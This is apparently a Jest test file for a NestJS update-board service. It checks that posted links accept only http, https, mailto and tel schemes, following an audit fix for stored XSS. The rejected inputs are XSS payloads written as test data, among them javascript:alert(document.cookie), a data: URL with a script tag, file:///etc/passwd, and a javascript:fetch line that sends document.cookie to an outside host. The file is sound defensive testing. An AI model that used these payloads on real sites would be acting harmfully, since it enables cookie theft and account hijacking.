import { BadRequestException } from '@nestjs/common';
import { UpdateBoardService, isSafeLinkUrl } from './update-board.service';

/**
 * Links on an update are rendered as `<a href>` for every internal role. Before the
 * 24 Oct 2026 audit fix any string was stored, so anyone with updateBoard:create could
 * post a `javascript:` link that ran in the tracker's origin for whoever clicked it.
 */
describe('isSafeLinkUrl', () => {
  it.each([
    'https://drive.example.com/plan.pdf',
    'http://example.com',
    'mailto:pm@example.com',
    'tel:+15125550100',
  ])('allows %s', (url) => {
    expect(isSafeLinkUrl(url)).toBe(true);
  });

  it.each([
    'javascript:alert(document.cookie)',
    'JavaScript:alert(1)',
    'java\tscript:alert(1)', // the URL parser drops tabs, exactly as the browser does
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '//evil.example/x', // protocol-relative: no scheme of its own
    'www.example.com', // relative — would resolve against the tracker itself
  ])('refuses %s', (url) => {
    expect(isSafeLinkUrl(url)).toBe(false);
  });
});

describe('UpdateBoardService — links on create and update', () => {
  const post = { id: 'post-1', createdById: 'u1', pinned: false, projectId: null, buildingId: null, unitId: null };
  let prisma: any;
  let service: UpdateBoardService;

  beforeEach(() => {
    prisma = {
      updateBoardPost: {
        create: jest.fn(async ({ data }: any) => ({ ...post, ...data, assignments: [] })),
        update: jest.fn(async ({ data }: any) => ({ ...post, ...data })),
        findFirst: jest.fn(async () => ({ ...post, restricted: false, attachments: [] })),
        findUnique: jest.fn(async () => ({ ...post, restricted: false, attachments: [] })),
      },
      updateBoardAssignment: { deleteMany: jest.fn(), createMany: jest.fn() },
      user: { findMany: jest.fn(async () => []) },
      $transaction: jest.fn(async (fn: any) => fn(prisma)),
    };
    const notifications = { createForUsers: jest.fn(), create: jest.fn(), notifyRoles: jest.fn() };
    service = new UpdateBoardService(prisma, { signedUrl: jest.fn() } as any, notifications as any);
    // Notification fan-out is not under test here.
    jest.spyOn(service as any, 'notifyPosted').mockResolvedValue(undefined);
    jest.spyOn(service as any, 'notifyAssigned').mockResolvedValue(undefined);
  });

  it('refuses a javascript: link with a 400 that says what is allowed, and stores nothing', async () => {
    const attempt = service.create(
      { title: 'Site photos', links: [{ url: 'javascript:fetch("//x/?c="+document.cookie)', label: 'Photos' }] },
      'u1', 'SALES',
    );
    await expect(attempt).rejects.toBeInstanceOf(BadRequestException);
    await expect(attempt).rejects.toThrow(/http:\/\/, https:\/\/, mailto: or tel:/);
    expect(prisma.updateBoardPost.create).not.toHaveBeenCalled();
  });

  it('refuses the whole save when ANY link is unsafe, not just that row', async () => {
    await expect(
      service.create(
        { title: 'x', links: [{ url: 'https://ok.example' }, { url: 'data:text/html,hi' }] },
        'u1', 'SALES',
      ),
    ).rejects.toBeInstanceOf(BadRequestException);
    expect(prisma.updateBoardPost.create).not.toHaveBeenCalled();
  });

  it('stores http(s), mailto and tel links, trimmed, and still drops blank rows', async () => {
    await service.create(
      {
        title: 'Contacts',
        links: [
          { url: '  https://drive.example.com/a  ', label: ' Plans ' },
          { url: 'mailto:gc@example.com' },
          { url: 'tel:+15125550100' },
          { url: '   ' },
        ],
      },
      'u1', 'SALES',
    );
    expect(prisma.updateBoardPost.create.mock.calls[0][0].data.links).toEqual([
      { url: 'https://drive.example.com/a', label: 'Plans' },
      { url: 'mailto:gc@example.com', label: '' },
      { url: 'tel:+15125550100', label: '' },
    ]);
  });

  it('refuses an unsafe link on update before opening the transaction', async () => {
    jest.spyOn(service, 'findById').mockResolvedValue({ ...post } as any);
    await expect(
      service.update('post-1', { links: [{ url: 'javascript:alert(1)' }] }, 'u1', 'SALES'),
    ).rejects.toBeInstanceOf(BadRequestException);
    expect(prisma.$transaction).not.toHaveBeenCalled();
  });
});
